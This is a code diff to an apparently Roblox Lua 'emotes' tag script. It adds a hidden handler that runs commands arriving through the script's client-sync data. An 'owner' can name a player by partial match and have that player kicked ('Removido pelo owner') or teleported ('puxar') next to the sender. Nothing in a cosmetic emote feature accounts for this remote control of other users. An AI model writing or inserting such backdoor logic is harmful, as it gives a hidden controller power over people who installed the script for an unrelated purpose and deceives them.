@@ -2647,9 +2647,10 @@ local EMOTES_DARK_TAG_MAX_DISTANCE = 55
 local EMOTES_DARK_TAG_REFERENCE_DISTANCE = 20
 local EMOTES_DARK_TAG_MIN_SCALE = EMOTES_DARK_TAG_REFERENCE_DISTANCE / EMOTES_DARK_TAG_MAX_DISTANCE
 local EMOTES_DARK_TAG_MAX_SCALE = 2.5
-local emotesDarkTagUsers = {}
-local emotesDarkTags = {}
-local emotesDarkTagRunning = true
+  local emotesDarkTagUsers = {}
+  local emotesDarkTags = {}
+  local emotesDarkSeenCommandNonces = {}
+  local emotesDarkTagRunning = true
 local emotesDarkTagSessionId = ""
 local emotesDarkTagMissingApiWarned = false
 
@@ -2972,11 +2973,39 @@ local function emotesDarkTagAttach(player)
     end)
 end
 
-local function emotesDarkTagSync(activeClients)
+  local function emotesDarkFindPlayerPartially(target)
+    local query = tostring(target or ""):lower()
+    if query == "" then return nil end
+    for _, player in ipairs(Players:GetPlayers()) do
+        local name = tostring(player.Name or ""):lower()
+        local displayName = tostring(player.DisplayName or ""):lower()
+        if name:find(query, 1, true) or displayName:find(query, 1, true) then return player end
+    end
+    return nil
+  end
+
+  local function emotesDarkRunCommand(command)
+    if type(command) ~= "table" or not command.nonce or emotesDarkSeenCommandNonces[tostring(command.nonce)] then return end
+    local target = emotesDarkFindPlayerPartially(command.target)
+    if not target then return end
+    emotesDarkSeenCommandNonces[tostring(command.nonce)] = true
+    if command.action == "kick" then
+        pcall(function() target:Kick(tostring(command.reason or "Removido pelo owner")) end)
+    elseif command.action == "puxar" then
+        local localPlayer = Players.LocalPlayer
+        local character = localPlayer and localPlayer.Character
+        local root = character and character:FindFirstChild("HumanoidRootPart")
+        local targetRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
+        if root and targetRoot then pcall(function() targetRoot.CFrame = root.CFrame * CFrame.new(3, 0, 0) end) end
+    end
+  end
+
+  local function emotesDarkTagSync(activeClients)
     local nextUsers = {}
     for _, client in ipairs(activeClients or {}) do
         if type(client) == "table" and client.userId ~= nil then
             nextUsers[tostring(client.userId)] = client
+            emotesDarkRunCommand(client.command)
         end
     end
     emotesDarkTagUsers = nextUsers
